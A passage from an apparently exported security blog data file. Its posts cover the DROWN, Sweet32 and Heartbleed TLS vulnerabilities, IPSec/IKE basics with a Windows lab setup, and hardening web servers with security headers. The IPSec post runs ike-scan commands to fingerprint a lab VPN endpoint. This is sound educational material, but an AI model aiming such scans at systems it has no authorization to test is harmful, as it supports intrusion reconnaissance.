hours, at a cost of $440 on Amazon EC2.\n\n## Quick Reference \n\n### Description\n\nDecrypting RSA with Obsolete and Weakened eNcryption (DROWN) is an attack that demonstrates that even if you do not allow SSLv2, simply supporting it can be dangerous. It allows an attacker to decrypt TLS connections between clients and servers.\n\n### Abbreviation\n\nDROWN\n\n### Name\n\nDecrypting RSA with Obsolete and Weakened eNcryption\n\n### CVE Number\n\nCVE-2016-0800\n\n### Type of Vulnerability\n\nWithin the SSL v2.0 protocol when paired with export grade ciphers. \n\n### Affected\n\nTwo types of systems are vulnerable. \n\n1. A system supporting SSLv2. (Systems that support SSLv2 negotiation are still surprisingly common!)\n2. A system that uses its private key on any other server that allows SSLv2 connections, even if it is for a different protocol. TLS, for example, is another protocol. The original system is vulnerable as long as SSLv2 can be negotiated on the second system.\n\n### Remediation\n\nRemove support for SSL v2, and best practises would suggest removing anything older than TLS 1.1. TLS 1.0 does not need to be supported. \n\nEven if you are confident that you have disabled SSLv2 on your HTTPS server, you could be reusing your private key on another server (such as an email server) that does support SSLv2. We recommend manually inspecting all servers that use your private key."},{"fields":{"slug":"/reporting-in-english-for-non-natives"},"excerpt":"When looking at the analytics for evilsaint.com, it always surprises me just how wide an audience this website receives! As a native English…","frontmatter":{"date":"7th January 2022 ","title":"Reporting in English for non-natives","description":"Reporting in English for non-natives","tags":"reporting","posttype":"blog"},"body":"When looking at the analytics for evilsaint.com, it always surprises me just how wide an audience this website receives! As a native English speaker who dropped foreign language study at the earliest opportunity school presented, I am amazed at the number of people around the world who take time to read what I post. \n\nI recently was involved in a panel discussing report writing and some of the associated challenges that people face; we talked at length about many topics from learning difficulties, physical handicaps, educational issues, and language comprehension. \n\nWhile the panel discussions sparked many topics, one particular interesting share of note (or at least I felt so), was from a non-native English speaker who has been writing penetration testing reports in English for over six years. \n\nThis person gave the perspective of how they write reports, stating that they often make mistakes when they try and do literal translations from their native language into English. They gave examples and pointed out commonly confused items. Upon asking how they circumvented this problem, they directed me to a resource online which I will now share with you (Please see references below)\n\nThis document has assembled many misused English words and expressions that have appeared in EU publications and discusses the correct usage. Even if English is your native language, you might learn something, and I encourage you to do so."},{"fields":{"slug":"/vulnerabilities-in-ssl-and-tls-sweet32"},"excerpt":"Main Points Sweet32 takes advantage of weaknesses in the design of some ciphers.Allows an attacker to recover small portions of plaintext…","frontmatter":{"date":"7th January 2022 ","title":"Vulnerabilities in SSL & TLS :- Sweet32","description":"In this article, we will look at CVE Numbers CVE-2016–2183 and CVE-2016–6329, also known as the Sweet32 attack. The attack which involves collecting SSL traffic using legacy block ciphers via a person-in-the-middle context and subjecting it to a collision attack.","tags":"ssl, sweet32, tls","posttype":"article"},"body":"## Main Points\n\n- Sweet32 takes advantage of weaknesses in the design of some ciphers.\n- Allows an attacker to recover small portions of plaintext encrypted with 64-bit block ciphers (such as Triple-DES and Blowfish).\n- Based on the use of legacy block ciphers, which are vulnerable to a practical collision attack when used in CBC mode. A simple birthday attack can be used to identify 64-bit block cipher collisions when using the CBC mode of operation. When a collision occurs, it means that the input and output are the same, allowing the encrypted data to be exfiltrated.\n- The use of a 64-bit block ciphers is likely to produce a collision after 32 GB of data, but for a practical attack the researchers found that up to 785 GB of data is required.\n- A specific weakness in the OpenSSL implementation of SSLv2 allows for a 'special DROWN attack,' which greatly reduces the effort required to break the encryption, allowing for real-time person-in-the-middle attacks.\n\n## Quick Reference\n\n### Description\n\nThe attack which involves collecting SSL traffic using legacy block ciphers via a person-in-the-middle context and subjecting it to a collision attack.\n\n### Abbreviation\n\nSWEET32\n\n### Name\n\nSWEET32\n\n### CVE Number\n\nCVE-2016–2183 and CVE-2016–6329\n\n### Type of Vulnerability\n\nThe attack takes advantage of flaws in the design of some block ciphers.\n\n### Affected\n\nCarrying out the TLS variant of the Sweet32 attack successfully requires a very specific set of capabilities on the part of the attacker:\n\n- The attacker must be able to run JavaScript in the victim's browser to generate data for transmission to the server.\n- The attacker must keep the victim on the malicious JavaScript page for one to two days to generate enough ciphertext blocks to find a collision.\n\n### Remediation\n\nDo not support or negotiate 3DES cipher-suites. At a minimum, AES should be preferred over 3DES. Limit the length of the TLS session."},{"fields":{"slug":"/vulnerabilities-in-ssl-and-tls-heartbleed"},"excerpt":"Main Points Does not require a person-in-the-middle position to work -- unlike many other attacks in our \"Vulnerabilities in SSL/TLS…","frontmatter":{"date":"6th January 2022 ","title":"Vulnerabilities in SSL & TLS :- Heartbleed","description":"In this article, we look at CVE Number CVE-2014-0160 or what is commonly referred to as the Heartbleed vulnerability; a buffer overflow in the Heartbeat extension of OpenSSL. A malicious client could send a specially crafted packet to disclose a limited portion of the server or computer's memory per request from a connected client or server. The disclosed portions of memory could include sensitive information, such as private keys, names, usernames, passwords and/or any other data on the system.","tags":"heartbleed, openssl, ssl, tls","posttype":"article"},"body":"## Main Points\n\n- **Does not** require a person-in-the-middle position to work -- unlike many other attacks in our \"Vulnerabilities in SSL/TLS\" series.\n- Found in OpenSSL's implementation of the SSL/TLS protocol -- rather than the protocol itself or one of its components.\n- OpenSSL 1.0.1 added a \"Heartbeat\" extension in December 2011 whose goal was to avoid the need to re-establish SSL sessions and extend their lifespan. Later, a flaw was introduced into the Hearbeat extension's code.\n- Apache and Nginx power much of the internet's infrastructure and by default use OpenSSL. Some sources claim that at the time of the Heartbleed attack, 17% of the internet was vulnerable.\n- Heartbleed is a programming error. The TLS heartbeat extension lacks a bounds check, causing incorrect input validation. The extension returns memory contents without checking how much is returned.\n- PHD Student Robin Seggelmann, co-author of the Heartbeat extensions RFC, introduced the bug into the code. Stephen N. Henson, one of OpenSSL's four core developers, reviewed the code. Henson overlooked a flaw in Seggelmann's implementation, which was introduced into OpenSSL's source code repository on December 31, 2011. The flaw spread rapidly with the release of OpenSSL 1.0.1 on March 14, 2012, with Heartbeat support enabled by default. 1.0.1g, released on April 7, 2014.\n- Affects either a server or a client using a vulnerable OpenSSL TLS instance.\n\n## Quick Reference\n\n### Abbreviation\n\nNo abbreviation, just referred to as Heartbleed. \n\n### Name\n\nHeartbleed\n\n### CVE Number\n\nCVE-2014-0160\n\n### Where is Vulnerability\n\nThe vulnerability is in the OpenSSL implementation of SSL/TLS and not the SSL/TLS protocol itself.  \n\n### Affected\n\nOnly 1.0.1 and 1.0.2-beta releases of OpenSSL are affected including 1.0.1f and 1.0.2-beta1.\n\n### Remediation\n\nAs long as the vulnerable version of OpenSSL is in use, it can be abused. Upgrade to a patched version of OpenSSL."},{"fields":{"slug":"/ip-sec-introduction-part-2"},"excerpt":null,"frontmatter":{"date":"4th January 2022 ","title":"IP Sec - Introduction Part 2","description":"In the second part of this article on IPSec we will be looking at the difference between main mode and aggressive mode and how to configure IKE in a lab environment using a Windows Server 2016 and a Windows 10 virtual machine. We then proceed to enumerate this setup with some tools bundled in Kali Linux.","tags":"ike, isakmp","posttype":"article"},"body":"Let us go over a summary of the points we covered in the introduction.\n\n- IKE is an implementation of the Internet Security Association Key Management Protocol (ISAKMP) along with the use of Oakley and SKEME protocols.\n- IKE communicates through UDP port 500.\n- IKE authentication methods support pre-shared keys, public-key encryption, and digital signatures.\n- IKE uses a two-phase process to establish the IPsec SA.\n- IKE phase one authenticates the peers who establish an ISAKMP SA, which is used during Phase two. The second Phase establishes an IPsec SA;\n- IKE phase one can run in two modes, \"main mode\" or \"aggressive mode\".\n- Phase two only has a single mode called Quick mode.\n\nPhase one, as mentioned, can be run in two modes called \"main mode\" or \"aggressive mode\". When testing IPsec VPN systems, we will primarily be dealing with IKE phase one as Phase two is only accessible upon successful authentication.\n\n## \"main mode\" or \"aggressive mode\"\n\nMain Mode\n\n- Six messages are sent in total.\n- The expensive DH computation is not performed until after the first packet is exchanged, and the peer IDs are passed encrypted not in the clear.\n- Due to the way it is calculated, it is not possible to use the \"main mode\" with pre-shared key authentication unless the IP address of the initiator (client) is known beforehand. Client IPs are usually dynamic in remote access situations.\n\nAggressive mode\n\n- Optional, so not all VPN services will support it.\n- Only three messages are sent in instead of the six used in \"main mode\", which reduces the time required to complete Phase one exchange, but it impacts security integrity because the peer ID is passed in the clear, not encrypted.\n- This mode is generally used in a remote access VPN solution.\n- Aggressive mode is susceptible to resource exhaustion because the expensive DH computation must be performed immediately after receiving the first packet.\n\n## Configuring IPSec\n\nLab Nine in *La Maison de saint* is the following setup: a Windows Server 2016 and a Windows 10, 64-bit operating system. It can be seen in the screenshot that both machines have non-persistent hard disks and have their operating system build numbers in their title. They are both set up on their own VM Net Number.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/16e99dcd-fac2-4635-b8d2-19dcf8f1ba91.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">  </figcaption></figure>\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/f251ca61-a2d6-4d7d-bf93-61d86f0630d3.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">  </figcaption></figure>\n\n<aside>\n💡 Note,  the benefit of non-persistent disks is that they will maintain the configuration if the machine is rebooted. However, if the machine is shut down, it will revert to its previous configuration when turned back on.\n</aside>\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/3f7498cb-d58f-4cb0-9fad-6f58f7ee317f.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">  </figcaption></figure>\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/e7597ff9-5b3f-454a-a6d2-df0c6b80379e.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">  </figcaption></figure>\n\nInitial configuration if we look at the above screenshots, we can identify the two machines' hostname and IP address. The windows 10 machine is called \"client\", and the Windows Server machine is called \"server\". These are on IP 10.10.10.100 and 10.10.10.250\n\nThere is an IIS default web application on port 80 of the server that we will connect to test the IP Sec configuration.  The below screenshot shows the connection to the web application and a blend of TCP and HTTP traffic showing up in Wireshark. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/2920a73d-9649-43af-abce-d26b900989e8.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">Wireshark open and HTTP traffic showing. Web application (IIS default start page)</figcaption></figure>\n\nLet us navigate to the start menu and open \"Windows Firewall with Advanced Security\".\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/623916a1-7a2f-4c09-b7d9-a660b45ef4b5.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">  </figcaption></figure>\n\nWe will open the Windows Firewall with Advanced Security, select Connect security policy from the left-hand side, and create a new rule on the right-hand side.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/da5a5280-fc26-44b4-a4c7-0d55a1fc6cbe.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">  </figcaption></figure>\n\nIn the modal that appears, we will have five different rule options.\n\n- Isolation\n- Authentication exemption\n- server-to-server\n- Tunnel\n- Custom\n\nWe will configure a server to server connection.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/42c71ddf-36a0-42a5-900f-9d6bef82afb0.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">  </figcaption></figure>\n\nIt will then ask us for the endpoints; we can select the two endpoints per the IP Addresses mentioned earlier.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/fd0dfa3a-7106-44c3-af8f-50a791ec3170.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">  </figcaption></figure>\n\nOn the next screen, we are asked several options regarding whether we want to require or request authentication for inbound and outbound scenarios. We want to request authentication for inbound and outbound connections, but we will not require it for communication (It is nice to have, desired but not enforced).\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/7cb25c35-099c-432a-8402-5845d69573fd.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">  </figcaption></figure>\n\nOn the following screen, we can set up an authentication method. As mentioned previously, we can see computer certificates as one of the authentication options. If we select the Advanced option and click customise, we will be taken to a screen to configure a customised advanced authentication method.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/7d634e06-f6b9-4435-b7c7-64909235b215.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">  </figcaption></figure>\n\nIn this case, we will click to add the first authentication method and select the pre-shared key.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/01176cb6-8749-44ff-9ce8-88868e1fe1d0.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">  </figcaption></figure>\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/dbb1dab6-5843-4253-a585-c973e23b7494.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">  </figcaption></figure>\n\nPre-Shared Keys (as you can see from the warning) are not recommended; however, they are the easiest way to set up the configuration for our lab.\n\nWe will then click OK and OK again, then select next to move on to the next screen. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/7179dcfb-f060-43ab-92b4-a05655d52ff8.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">  </figcaption></figure>\n\nWe will apply this rule to all types of networks, domain, private and public.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/af164b02-b866-46cc-931f-2973fbd34170.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">  </figcaption></figure>\n\nWe will now refresh our browser connection and look inside Wireshark. Packets 61 and 62 show are initial connection on TCP port 80 and then shortly after we can now see the six packets that make up the \"main mode\" and the following \"quick mode\" packets.\n\nBecause we have set up a secure connection between two endpoints, as shown in the following screenshots, we will not gain an IKE handshake as our testing machine cannot fall in the endpoint IP range.\n\nHowever, if we set the endpoint range to be any in the following range, and we happen to be inside that range, then we might get some output that we can see from our penetration testing tools.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/03f2b448-4b09-41af-8074-9dfd4e5a24e6.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">  </figcaption></figure>\n\n## Using Ike-Scan\n\nWe can identify IPsec VPN points with Ike-Scan.\n\nIf we run `ike-scan` against our server with no arguments you can see if has negotiated a handshake and we can see the details of the SA\n\n```bash\nsudo ike-scan 10.10.10.250\nStarting ike-scan 1.9.4 with 1 hosts ([http://www.nta-monitor.com/tools/ike-scan/](http://www.nta-monitor.com/tools/ike-scan/))\n10.10.10.250    Main Mode Handshake returned HDR=(CKY-R=0cf85f1d8b3df6a4) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080) VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8) VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T) VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\\n) VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation) VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable) VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)\n\nEnding ike-scan 1.9.4: 1 hosts scanned in 0.008 seconds (129.87 hosts/sec).  1 returned handshake; 0 returned notify\n```\n\nFor clarity we can add the `-M` option for multi-line mode to make it easier to read.\n\n```bash\nsudo ike-scan 10.10.10.250 -M                                                                                                                                                            \nStarting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)\n10.10.10.250    Main Mode Handshake returned\n        HDR=(CKY-R=eb5de8bbb1bcb7d6)\n        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)\n        VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8)\n        VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T)\n        VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\\n)\n        VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation)\n        VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable)\n        VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)\n\nEnding ike-scan 1.9.4: 1 hosts scanned in 0.008 seconds (120.63 hosts/sec).  1 returned handshake; 0 returned notify\n```\n\nIf we just want to check the mode i.e. Main or Aggressive then we might want to use the `--quiet` flag to get rid of any superfluous SA information. \n\n```bash\nsudo ike-scan 10.10.10.250 --quiet\nStarting ike-scan 1.9.4 with 1 hosts ([http://www.nta-monitor.com/tools/ike-scan/](http://www.nta-monitor.com/tools/ike-scan/))\n10.10.10.250    Main Mode Handshake returned\n\nEnding ike-scan 1.9.4: 1 hosts scanned in 0.007 seconds (151.15 hosts/sec).  1 returned handshake; 0 returned notify\n```\n\nIn this example we have been fortunate to be able to negotiate an SA. However on another endpoint we might not be so successful. We can use the `--trans` flag to specify values that make up a custom transform. \n\n```bash\nsudo ike-scan 10.10.10.250 -M -v --trans=5,2,1,2\nDEBUG: pkt len=84 bytes, bandwidth=56000 bps, int=16000 us\nStarting ike-scan 1.9.4 with 1 hosts ([http://www.nta-monitor.com/tools/ike-scan/](http://www.nta-monitor.com/tools/ike-scan/))\n10.10.10.250    Main Mode Handshake returned\nHDR=(CKY-R=581954ce022c82e2)\nSA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)\nVID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8)\nVID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T)\nVID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\\n)\nVID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation)\nVID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable)\nVID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)\n\nEnding ike-scan 1.9.4: 1 hosts scanned in 0.007 seconds (135.19 hosts/sec).  1 returned handshake; 0 returned notify\n```\n\nWe can lookup the values below\n\n**Encryption Algorithm Values**\n\n1 = DES\n2 = IDEA\n3 = Blowfish\n4 = RC5\n5 = Triple DES\n6 = CAST\n7 = AES\n8 = Camellia\n\n**Hash Algorithm Values**\n\n1 = MD5\n2 = SHA1\n3 = Tiger\n4 = SHA2-256\n5 = SHA2-384\n6 = SHA2-512\n\n\n**Authentication Method Values**\n\n1\t\t= Pre-Shared Key\n2\t\t= DSS Signature\n3\t\t= RSA Signature\n4\t\t= RSA Encryption\n5\t\t= Revised RSA Encryption\n6\t\t= ElGamel Encryption\n7\t\t= Revised ElGamel Encryption\n8\t\t= ECDSA Signature\n64221\t= Hybrid Mode\n65001\t= XAUTH\n\n**Diffie-Hellman Group Values**\n\n1\t= MODP 768\n2\t= MODP 1024\n3\t= EC2N 155\n4\t= EC2N 185\n5\t= MODP 1536\n6\t= EC2N 163\n7\t= EC2N 163\n8\t= EC2N 183\n9\t= EC2N 183\n10\t= EC2N 409\n11\t= EC2N 409\n12\t= EC2N 571\n13\t= EC2N 571\n14\t= MODP 2048\n15\t= MODP 3072\n16\t= MODP 4096\n17\t= MODP 6144\n18\t= MODP 8192"},{"fields":{"slug":"/ip-sec-introduction"},"excerpt":null,"frontmatter":{"date":"3rd January 2022 ","title":"IP Sec - Introduction","description":"This is a two part article that will go over the fundamentals of IPSec. We will start with a background of IPSec, and take a look at configuring an IPSec tunnel. Then we will run the pentest tool ike-scan against our configured IPSec tunnel and collect and analyse traffic in wireshark.","tags":"ike, isakmp","posttype":"article"},"body":"<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/8b11686c-7367-4f73-9278-6d8b142cf1f5.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">IPSec Overview</figcaption></figure>\n\nIPSec is a framework of open standards. The benefit of being a framework is that if one component gets superseded, it can be replaced, or additional items can be added. The suite of protocols that make up IPSec allows secure, encrypted communication between two computers.\n\nUses of IPsec\n\n- Authenticating and encrypting host-to-host traffic.\n- Authenticating and encrypting traffic to specific servers.\n- Using L2TP/IPsec for VPN connections.\n- Site-to-site tunneling.\n- Enforcing logical networks.\n\n## Overview\n\nIPSec was designed to provide security options and enhancements to Internet Protocol (IP) and negate Internet Protocol weaknesses.\n\nIPsec provided the following security.\n\n- Authentication - IP spoofing and packet source forgery issues.\n- Data Integrity - Modification of data within IP packets.\n- Anti-replay - Replaying packet attacks.\n- Data Confidentiality - Prevent packet sniffing attacks.\n\nIPSec consists of three core components. IKE, ESP and AH.\n\n**Internet Key Exchange (IKE)** is a network security Protocol designed to allow two devices to dynamically exchange Encryption Keys and negotiate Security Associations (SA). Internet Key Exchange (IKE) Security Associations (SA) can be established dynamically and removed after a negotiated period.\n\n**Encapsulating Security Payload (ESP)** provides IPSec data integrity, encryption, authentication, and anti-replay functions. ESP authenticates the data within the VPN, ensuring the integrity of the data and that it is coming from the correct source. Encapsulating Security Payload can provide encryption via two modes. Transport mode and Tunnel mode. In transport mode, the payload is encrypted, and in tunnel mode, the entire packet is encrypted.\n\n**Authentication Header (AH)** provides data integrity, authentication, and anti-replay functions for IPSec. Authentication Header (AH) does not, however, provide any data encryption. Authentication Header (AH) is used to provide data integrity services to ensure that no data tampering has occurred during transmission.\n\nSo just to run that back again, the authentication header (AH) is concerned with ensuring that packets get delivered and maintain their integrity. It will block against replay attacks and make sure data has not been modified; however, it does not encrypt. Encapsulating Security Payload (if used) encapsulates and encrypts the IP datagrams to protect them from sniffing attacks in addition to what AH does alone.\n\n<aside>\n💡 Why would we ever use AH if ESP does everything? In short, when overhead and packet size becomes issues. ESP encapsulates packets with much overhead.\n\n</aside>\n\n## A look at IKE and ISAKMP\n\nIKE or Internet Key Exchange protocol is a protocol that sets up Security Associations (SAs) in the IPSec protocol suite.\n\nInternet Key Exchange (IKE) is a hybrid protocol that consists of 3 protocols.\n\n- ISAKMP: It is not a key exchange protocol per se. It is a framework on which key exchange protocols operate.\n- Oakley: Describes the \"modes\" of key exchange (e.g. perfect forward secrecy for keys, identity protection, and authentication)\n- SKEME: Provides support for public-key-based Key exchange, key distribution centres, and manual installation. It also outlines methods of secure and fast key refreshment.\n\nIn many texts, the terms IKE and ISAKMP are used interchangeably, which often confuses people in picking up this topic. Although we have briefly touched on their relationship, let us clarify the difference between IKE and ISAKMP.\n\nInternet Security Association Key Management Protocol (ISAKMP) is a framework for authentication and key exchange between two peers to establish, modify, and tear down SAs. It is designed to support many different kinds of key exchanges, not just IKE. ISAKMP uses UDP port 500 for communication between peers and is why port 500 is commonly associated with IPSec VPN.\n\nIKE is the implementation of ISAKMP using the Oakley and Skeme key exchange techniques. Oakley provides perfect forward secrecy (PFS) for keys, identity protection, and authentication; Skeme provides anonymity, reputability, and quick key refreshment.\n\nThink of ISAKMP as a framework, and IKE is an implementation of ISAKMP using the Oakley and Skeme key exchange techniques. Oakley provides perfect forward secrecy (PFS) for keys, identity protection, and authentication; Skeme provides anonymity, reputability, and quick key refreshment.\n\nEstablishing an IPSec tunnel requires two IKE phases.\n\n## IKE Phases\n\nIPsec VPNs are negotiated in phases\n\n- Successful Phase I negotiation results in an IKE Security Association (SA)\n- Successful Phase II negotiation results in two separate IPsec SAs for the directions in and out.\n- Phase II or (Quick Mode) happens through the Phase I tunnel.\n\n### Phase I\n\n- This Phase is where the IKE SA (Internet Key Exchange Security Association) is negotiated. This Phase can be performed in one of two Modes: Main (MM) or Aggressive (AM)\n\n### Phase II\n\n- This Phase is where the IPSec SA is negotiated. The IPSec tunnel (also called the IKE Phase II tunnel) build is complete when this Phase is completed. This Phase only has one mode called Quick Mode.\n\n## IPSec Implementation\n\nMost IPsec implementations use the Internet Key Exchange (IKE) service. Some older IPsec implementations use manual keying (Which involves exchanging encryption and authentication keys in advance), but this is now considered obsolete. As discussed briefly in the introduction, the Internet Key Exchange (IKE) protocol is used to negotiate the cryptographic algorithm choices and generate the associated keys. The Authentication Header (AH) and Encapsulating Security Payload (ESP) then use these choices.\n\nThe Internet Security Association and Key Management Protocol (ISAKMP) provides the framework for establishing SAs. A security association (SA) is a logical connection involving two devices that transfer data. With the help of the defined IPsec protocols, SAs offer data protection for unidirectional traffic. Generally, an IPsec tunnel features two unidirectional SAs, which offer a secure, full-duplex channel for data.\n\nA security association consists of parameters I remember as HAGLE:\n\nH = Hash Algorithm\n\nA = Authentication Method\n\nG = Group Number\n\nL = Lifetime Value\n\nE = Encryption\n\nBoth sides store the SA parameters in their security Association database when complete, sometimes referenced as SAD."},{"fields":{"slug":"/web-security-headers"},"excerpt":null,"frontmatter":{"date":"2nd January 2022 ","title":"Web Security Headers","description":"Web application security headers can make a big difference in reducing the attack surface of a clients application. Knowing the differences is an essential part of a consultants repertoire.","tags":"browsers, content-security-policy, csp, hsts, security-headers, strict-transport-security, x-content-type-options, x-frame-options","posttype":"article"},"body":"HTTP Headers are typically easy to implement and can significantly increase the security of your website and help prevent security vulnerabilities like Cross-Site Scripting, Clickjacking, Information disclosure and more. In this article, we are concerned chiefly with five security headers that can be implemented to improve the security posture of your website.\n\n- X Frames Options\n    - X-Frames-Options\n- XSS Protection\n    - *X-XSS-Protection*\n- X Content-Type Options\n    - *X-Content-Type-Options*\n- Strict Transport Security Header (HSTS)\n    - *Strict-Transport-Security*\n- Content Security Policy (CSP)\n    - *Content-Security-Policy*\n\nWhile these headers are certainly not in order of importance, I have purposely left Security Headers with more discussion points until later in this article.\n\nA quick word on setting headers. While the exact location of a webservers domain configuration file can be customised, it is quite common for the Nginx and Apache Configuration files to be at the following locations named typically after the web domain name or utilising the default configuration example. If your website was `something.com`, then check for a file called `something.com.conf` or potentially `default.conf` if the default template file was used.\n\n- /etc/apache2/sites-enabled/<website name|default>.conf\n- /etc/nginx/sites-enabled/<website name|default>.conf file:\n\n## X Frames Options - X-Frames-Options\n\nThe X-Frame-Options HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a `<frame>`, `<iframe>`, `<embed>` or `<object>`. Sites can use this to avoid clickjacking attacks by ensuring that their content is not embedded into other sites.\n\nThere are three ways to configure X-Frame-Options:\n\n**DENY:** This will disable iframe features altogether.\n\n**SAMEORIGIN:** iframe can be used only by someone of the same origin.\n\n**ALLOW-FROM:** This will allow pages to be put in iframes only from specific URLs.\n\nNginx\n\n```bash\nadd_header X-Frame-Options \"SAMEORIGIN\";\n```\n\nApache\n\n```bash\nHeader always set X-Frame-Options \"SAMEORIGIN\"\n```\n\n## XSS Protection - *X-XSS-Protection*\n\nThe XSS Protection header is an older security header that enables cross-site scripting protection in Internet Explorer, Chrome and Firefox. Although this functionality is now provided by CSP, which allows us to block inline JavaScript, the header can still provide protection when used with older browsers that do not support the Content Security Policy header.\n\nYou can implement XSS protection using the three options depending on the specific need.\n\n**X-XSS-Protection: 0**: This will disable the filter entirely.\n\n**X-XSS-Protection: 1**: This will enable the filter but only sanitizes potentially malicious scripts.\n\n**X-XSS-Protection: 1; mode=block**: This will enable the filter and completely blocks the page.\n\nNginx\n\n```bash\nadd_header X-XSS-Protection \"1; mode=block\";\n```\n\nApache\n\n```bash\nHeader set X-XSS-Protection \"1; mode=block\"\n```\n\n## X Content-Type Options - X-Content-Type-Options\n\nThis header tells the browser that the Multipurpose Internet Mail Extensions (MIME) types advertised in the Content-Type header should be followed. This header was first introduced by Microsoft to prevent MIME sniffing.\n\nMIME sniffing is where a browser looks at the contents of a given resource and attempts to detect the MIME type. An attack vector can open up if an attacker can control the content of a resource or upload a new resource to a website, and this Security Header is not advertised in the resource response. The attacker might make non-executable content appear to be executable content and trick the browser into executing it in the victim's browser.\n\nNginx\n\n```bash\nadd_header X-Content-Type-Options \"nosniff\"\n```\n\nApache\n\n```bash\nHeader set X-Content-Type-Options \"nosniff\"\n```\n\n## Strict Transport Security Header (HSTS) - *Strict-Transport-Security*\n\nThe first header for discussion is the Strict Transport Security Header (HSTS). The HSTS forces web browsers or clients to communicate with servers but only through HTTPS connections. HSTS ensures that connections only use HTTPS and prevent man in the middle, downgrade, and cookie hijacking attacks. HSTS is a trust on first use (sometimes abbreviated as TOFU), meaning it must send at least one insecure connection over HTTP to the host to transfer the security header.\n\nThe HSTS preload list is an effort to provide browsers with a list of sites that support HSTS to avoid this initial, insecure connection. However, suppose a site is not on the list but uses the 'strict-transport-security' header; after the initial exchange, the browser will only request access to the website over Transport Layer Security (TLS).\n\nNginx\n\n```bash\nadd_header Strict-Transport-Security 'max-age=31536000; includeSubDomains; preload';\n```\n\nApache\n\n```bash\nHeader set Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\"\n```\n\n## Content Security Policy (CSP) - *Content-Security-Policy*\n\nContent Security Policy, sometimes abbreviated as CSP, 